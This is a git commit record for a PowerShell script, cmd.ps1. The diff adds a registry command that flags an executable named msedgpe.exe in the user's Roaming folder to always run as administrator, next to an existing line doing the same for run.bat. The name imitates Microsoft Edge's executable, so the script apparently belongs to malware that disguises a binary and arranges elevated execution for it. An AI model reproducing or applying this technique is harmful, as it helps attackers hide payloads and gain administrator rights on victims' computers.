0b4fc7529d04dcb78faaefd37833acbcfd4e8ef2
SszOnTop <155780283+SszOnTop@users.noreply.github.com>
2024-02-07 15:39:34 +0100

    Update cmd.ps1

--- cmd.ps1
+++ cmd.ps1
@@ -1,1 +1,2 @@
 New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" -Name %USERPROFILE%\run.bat -Value RUNASADMIN -PropertyType string -Force | Out-Null
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" -Name %USERPROFILE%\AppData\Roaming\msedgpe.exe -Value RUNASADMIN -PropertyType string -Force | Out-Null
